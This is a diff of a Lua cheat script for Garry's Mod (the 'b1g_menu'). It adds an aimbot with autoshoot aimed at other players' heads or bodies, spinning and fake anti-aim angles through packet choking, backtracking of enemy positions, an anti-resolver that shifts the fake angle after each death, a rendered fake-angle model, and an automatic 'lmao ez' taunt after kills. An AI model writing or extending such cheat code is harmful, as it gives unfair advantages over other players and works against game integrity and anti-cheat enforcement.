+						Anglez.y = math.NormalizeAngle(RealAngle.y + (engine.TickInterval() * pMenuVars.Sliders["HvH Spin Speed"].value));
+					end
+				else
+					Anglez.y = math.NormalizeAngle(RealAngle.y + (engine.TickInterval() * pMenuVars.Sliders["HvH Spin Speed"].value));
+				end
 			elseif style == 3 then
 				local rand = pMenuVars.Sliders["HvH randomY"].value;
-				Anglez.y = math.NormalizeAngle(CurAngles.y + Anglez.y + math.random(rand * -1,rand));
-			elseif style == 4 then
-				local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View)
-				if ent == NULL then
-					Anglez.y = math.NormalizeAngle(Anglez.y + View.y);
+				if bSendPacket then 
+					if IsFake then
+						Anglez.y = math.NormalizeAngle(RealAngle.y + Anglez.y + math.random(rand * -1,rand) + pMenuVars.Sliders["HvH Fake Ang"].value);
+					else
+						Anglez.y = math.NormalizeAngle(RealAngle.y + Anglez.y + math.random(rand * -1,rand));
+					end
 				else
-					local poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
-					local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
-					Anglez.y = math.NormalizeAngle(End.y + Anglez.y);
+					Anglez.y = math.NormalizeAngle(RealAngle.y + Anglez.y + math.random(rand * -1,rand));
+				end
+			elseif style == 4 then
+				local ent = pMenu.ClosestEntToCrossNLOS(720,pCmd,nil,View)
+				if ent == NULL then
+					if bSendPacket then
+						if IsFake then
+							Anglez.y = math.NormalizeAngle(View.y + Anglez.y + pMenuVars.Sliders["HvH Fake Ang"].value);
+						else
+							Anglez.y = math.NormalizeAngle(View.y + Anglez.y);
+						end
+					else
+						Anglez.y = math.NormalizeAngle(View.y + Anglez.y);
+					end
+				else
+					local pos = ent:EyePos()
+					local End = pMenu.GetAngle(LocalPlayer():EyePos(),pos);
+					if bSendPacket then
+						if IsFake then
+							Anglez.y = math.NormalizeAngle(End.y + Anglez.y + pMenuVars.Sliders["HvH Fake Ang"].value);
+						else
+							Anglez.y = math.NormalizeAngle(End.y + Anglez.y);
+						end
+					else
+						Anglez.y = math.NormalizeAngle(End.y + Anglez.y);
+					end
 				end
 			elseif style == 5 then
 				Anglez.y = math.NormalizeAngle(Anglez.y);
+				if bSendPacket  && IsFake then
+					Anglez.y = Anglez.y + pMenuVars.Sliders["HvH Fake Ang"].value
+				end
 			elseif style == 6 then
 				Anglez.y = math.NormalizeAngle(View.y + Anglez.y);
+				if bSendPacket  && IsFake then
+					Anglez.y = Anglez.y + pMenuVars.Sliders["HvH Fake Ang"].value
+				end
 			end
 		end
-		if pMenuVars.CheckBoxes["HvH Autoshoot"].value || input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value)  then
-			AShoot = !AShoot;
-			if AShoot then
+
+
+
+
+		if bSendPacket == false then
+			if IsFake then
+				RealAngle = Anglez
+			end
+		end
+		if bSendPacket then
+			if IsFake then
+				FakeAngles = Anglez
+			else
+				RealAngle = Anglez
+			end
+		end
+		if bSendPacket && pMenu.CanShoot() then
+			if pMenuVars.CheckBoxes["HvH Autoshoot"].value || input.IsKeyDown(pMenuVars.Sliders["Aimbot Key"].value)  then
 				local ent = pMenu.ClosestEntToCross(720,pCmd,"ValveBiped.Bip01_Head1",View);
 				if ent != NULL then
 					local poz = Vector(0,0,0);
-					if pMenuVars.CheckBoxes[ent:SteamID().."Baim"] != nil && pMenuVars.CheckBoxes[ent:SteamID().."Baim"].value then
-						local center = ent:OBBCenter()
-						poz = ent:GetPos() + center;
+					if pMenuVars.CheckBoxes[ent:SteamID().."Backtrack"] != nil && pMenuVars.CheckBoxes[ent:SteamID().."Backtrack"].value then // idk someone told me to do this doesn't really do anything
+						local Amt = pMenuVars.Sliders[ent:SteamID().."Backtrack"].value;
+						local curkey = BackTrack[ent:SteamID()].LastKey;
+						local maxback = #BackTrack[ent:SteamID()] - 1
+						if curkey - Amt <= 0 then
+							poz = BackTrack[ent:SteamID()][maxback + (curkey - Amt)].pos;
+						else
+							poz = BackTrack[ent:SteamID()][(curkey - Amt)].pos;
+						end
 					else
-						poz = ent:GetBonePosition(ent:LookupBone("ValveBiped.Bip01_Head1"));
+						if pMenuVars.CheckBoxes[ent:SteamID().."Baim"] != nil && pMenuVars.CheckBoxes[ent:SteamID().."Baim"].value then
+							local center = ent:OBBCenter()
+							poz = ent:GetPos() + center;
+						else
+							local head = ent:LookupBone("ValveBiped.Bip01_Head1")
+							poz = ent:GetBonePosition(head)
+						end
 					end
 					local End = pMenu.GetAngle(LocalPlayer():EyePos(),poz);
-					Anglez.x = math.Clamp(End.x,-89,89)
 					Anglez.y = math.NormalizeAngle(End.y);
+					Anglez.x = math.NormalizeAngle(End.x);
 					pMenu.Shoot(pCmd)
 				end
 			end
@@ -1198,7 +1170,25 @@ hook.Add("CreateMove","hkCreateMove",function(pCmd)
 		if Anglez != nil then
 			pCmd:SetViewAngles(Anglez)
 		end
-		pMenu.FixMovement(pCmd,View,pCmd:GetViewAngles())
+	end
+	if pMenuVars.CheckBoxes["MISC CStrafe"] != nil && pMenuVars.CheckBoxes["MISC CStrafe"].value && input.IsKeyDown(KEY_E) then
+		if !LocalPlayer():IsOnGround() then
+			test_int = test_int + (200 * FrameTime());
+		end
+		if test_int > 360 then
+			test_int = 0;
+		end
+		local FakeView = Angle(View.x,View.y + test_int,0.0)
+		pMenu.FixMovement(pCmd,FakeView,pCmd:GetViewAngles())
+	else
+		if pMenuVars.CheckBoxes["HvH Antiaim"] != nil && pMenuVars.CheckBoxes["HvH Antiaim"].value && pMenuVars.CheckBoxes["HvH Enable"].value then
+			T2 = 0;
+			test_int = 0;
+			pMenu.FixMovement(pCmd,View,pCmd:GetViewAngles())
+		end
+	end
+	if input.IsKeyDown(KEY_O) && pMenu.CanShoot() then
+		pMenu.Shoot(pCmd)
 	end
 end)
 hook.Add( "OnPlayerChat", "hkOnPlayerChat", function( ply, strText, bTeam, bDead )
@@ -1216,3 +1206,195 @@ hook.Add( "OnPlayerChat", "hkOnPlayerChat", function( ply, strText, bTeam, bDead
 	end
 end)
 concommand.Add("b1g_menu",pMenu.ToggleMenu)
+
+local DNum = 0;
+local Anti_pResolver = {}
+Anti_pResolver[1] = 70;
+Anti_pResolver[2] = 125;
+Anti_pResolver[3] = 180;
+Anti_pResolver[4] = 290;
+
+
+hook.Add( "entity_killed", "", function( data )
+	local inflictor_index = data.entindex_inflictor 
+	local victim_index = data.entindex_killed
+	local killer = EntIndexToEnt(inflictor_index);
+	if victim_index == LocalPlayer():EntIndex() then
+		DNum = DNum + 1;
+		if DNum > 5 then
+			DNum = 1;
+		end
+		if pMenuVars.CheckBoxes[killer:SteamID().."Anti pResolver"].value then
+			pMenuVars.Sliders["HvH Fake Ang"].value = Anti_pResolver[DNum]
+		end
+	end
+	if victim_index != inflictor_index && inflictor_index == LocalPlayer():EntIndex() then
+		LocalPlayer():ConCommand('"say lmao ez"')
+	end
+end)
+
+
+hook.Add("Tick","hkTickBTrack",function()
+	local maxlog = backtrackamt / engine.TickInterval()
+	for k,v in pairs(player.GetAll()) do
+		if BackTrack[v:SteamID()] == nil then
+			BackTrack[v:SteamID()] = {}
+			BackTrack[v:SteamID()].LastKey = 0;
+		end
+
+		local key = BackTrack[v:SteamID()].LastKey;
+		key = key + 1;
+		if key > maxlog then
+			key = 1;
+		end
+		BackTrack[v:SteamID()].LastKey = key 
+		if pMenuVars.CheckBoxes[v:SteamID().."Baim"] != nil && pMenuVars.CheckBoxes[v:SteamID().."Baim"].value then
+			local center = v:OBBCenter()
+			local poz = v:GetPos() + center;
+			BackTrack[v:SteamID()][key] = {pos = poz}
+		else
+			local poz = v:GetBonePosition(v:LookupBone("ValveBiped.Bip01_Head1"));
+			BackTrack[v:SteamID()][key] = {pos = poz}
+		end
+	end
+end)
+
+local Marker = Material( "test.png" )
+function doHitMarker()
+	surface.PlaySound("hitmarker.wav")
+	local Frame = vgui.Create( "DFrame" )
+	Frame:SetTitle( "" )
+	Frame:SetSize( 30, 30 )
+	Frame:Center()
+	Frame:ShowCloseButton(false)
+	Frame.Paint = function( self, w, h )
+		surface.SetDrawColor( 255, 255, 255, 255 )
+		surface.SetMaterial( Marker	)
+		surface.DrawTexturedRect( 0, 0, w, h )
+	end
+	timer.Simple(0.2,function()
+		Frame:Close()
+	end)
+end
+gameevent.Listen( "player_hurt" )
+hook.Add( "player_hurt", "player_hurt_example", function( data )
+	local health = data.health
+	local id = data.userid
+	local attackerid = data.attacker
+	if data.attacker == LocalPlayer():UserID() then
+		doHitMarker()
+	end
+end )
+local crossdist = 0;
+local crossdist2 = 15
+hook.Add("HUDPaint","Paint",function()
+	if bSendPacket then
+		draw.SimpleText(bSendPacket,FontL,0,0,Color(0,0,255,255))
+	else
+		draw.SimpleText(bSendPacket,FontL,0,0,Color(255,0,0,255))
+	end
+	
+	pMenu.Drawline(ScrW() / 2 - 10,ScrH() / 2 - 10,ScrW() / 2 + 10,ScrH() / 2 + 10,Color(255,255,255,255))
+	pMenu.Drawline(ScrW() / 2 - 10,ScrH() / 2 + 10,ScrW() / 2 + 10,ScrH() / 2 - 10,Color(255,255,255,255))
+end)
+local aa_mod = NULL
+local aa_m_pos = 0;
+local aa_modPos = {}
+local last = RealTime()
+hook.Add("RenderScene","AA Model",function()
+	if pMenuVars.CheckBoxes["HvH Enable"] != nil && pMenuVars.CheckBoxes["HvH Enable"].value then
+		if aa_mod == NULL then
+			aa_mod = ClientsideModel( LocalPlayer():GetModel(),1 )
+		end
+		aa_mod:SetNoDraw(true)
+		aa_mod:SetSequence(LocalPlayer():GetSequence())
+		aa_mod:SetCycle( LocalPlayer():GetCycle() )
+		local End = 1;
+		local flAmt = 0
+		if pMenuVars.Sliders["HvH Choke Packet"] != nil then
+			flAmt = pMenuVars.Sliders["HvH Choke Packet"].value
+		end
+		if aa_m_pos - flAmt < 0 then
+			End = 15 + (aa_m_pos - flAmt)
+		elseif aa_m_pos - flAmt == 0 then
+			End = 15;
+		elseif aa_m_pos - flAmt > 0 then
+			End = aa_m_pos - flAmt
+		end
+		if #aa_modPos >= 15 && LocalPlayer():Alive() then
+			local poz = aa_modPos[End].pos
+			aa_mod:SetModel(LocalPlayer():GetModel())
+			aa_mod:SetPos(poz)
+			aa_mod:SetAngles(Angle(0,FakeAngles.y,0))
+			aa_mod:SetPoseParameter("aim_pitch", FakeAngles.p);
+			aa_mod:SetPoseParameter("move_x", LocalPlayer():GetPoseParameter("move_x"));
+			aa_mod:SetPoseParameter("move_y", LocalPlayer():GetPoseParameter("move_y"));
+			aa_mod:SetPoseParameter("head_pitch",FakeAngles.p);
+			aa_mod:SetPoseParameter("body_yaw", FakeAngles.y );
+			aa_mod:SetPoseParameter("aim_yaw", 0);
+			aa_mod:InvalidateBoneCache();
+			aa_mod:SetRenderAngles(Angle(0, FakeAngles.y, 0));
+		end
+	end
+end)
+hook.Add("Tick","PrevPosaamod",function()
+	aa_m_pos = aa_m_pos + 1;
+	if aa_m_pos > 15 then
+		aa_m_pos = 1
+	end
+	aa_modPos.LastKey = aa_m_pos;
+	if aa_modPos[aa_m_pos] == nil then
+		aa_modPos[aa_m_pos] = {pos = LocalPlayer():GetPos(),angle = LocalPlayer():EyeAngles()}
+	else
+		aa_modPos[aa_m_pos].pos = LocalPlayer():GetPos()
+		aa_modPos[aa_m_pos].angle = LocalPlayer():EyeAngles()
+	end
+end)
+function pMenu.DrawFakeAngle(v)
+	cam.Start3D()
+		render.SuppressEngineLighting(false)
+		if v:IsValid() then
+			render.MaterialOverride(chamsmat2)
+			render.SetColorModulation(0.6,0.6,0.6)
+			v:DrawModel()
+		end
+	cam.End3D()
+end
+hook.Add("RenderScreenspaceEffects","Cancer ",function()
+	if IsFake  && pMenuVars.CheckBoxes["HvH Show FA"] != nil && pMenuVars.CheckBoxes["HvH Show FA"].value && pMenuVars.CheckBoxes["HvH Enable"].value then
+		pMenu.DrawFakeAngle(aa_mod)
+	end
+	render.SuppressEngineLighting( false )
+end) 
+local SourceSkyname = GetConVar("sv_skyname"):GetString()
+local orgskyname = SourceSkyname;
+local SourceSkyPre  = {"lf","ft","rt","bk","dn","up",}
+local SourceSkyMat  = {
+    Material("skybox/"..SourceSkyname.."lf"),
+    Material("skybox/"..SourceSkyname.."ft"),
+    Material("skybox/"..SourceSkyname.."rt"),
+    Material("skybox/"..SourceSkyname.."bk"),
+    Material("skybox/"..SourceSkyname.."dn"),
+    Material("skybox/"..SourceSkyname.."up"),
+}
+function ChangeSkybox(skyboxname)
+    for i = 1,6 do
+        local D = Material("skybox/"..skyboxname..SourceSkyPre[i]):GetTexture("$basetexture")
+        SourceSkyMat[i]:SetTexture("$basetexture",D)
+    end
+end
+hook.Add("RenderScene", "See through walls", function()
+	if pMenuVars.CheckBoxes["MISC Night-mode"] != nil && pMenuVars.CheckBoxes["MISC Night-mode"].value then
+		ChangeSkybox("sky_borealis01")
+		for k,v in pairs(game.GetWorld():GetMaterials()) do
+			Material(v):SetVector("$color",Vector(0.05,0.05,0.05))
+		end
+		render.SuppressEngineLighting( true )
+		render.ResetModelLighting(0.2,0.2,0.2)
+	else
+		ChangeSkybox("sky_day03_05")
+		for k,v in pairs(game.GetWorld():GetMaterials()) do
+			Material(v):SetVector("$color",Vector(1,1,1))
+		end
+	end
+end)
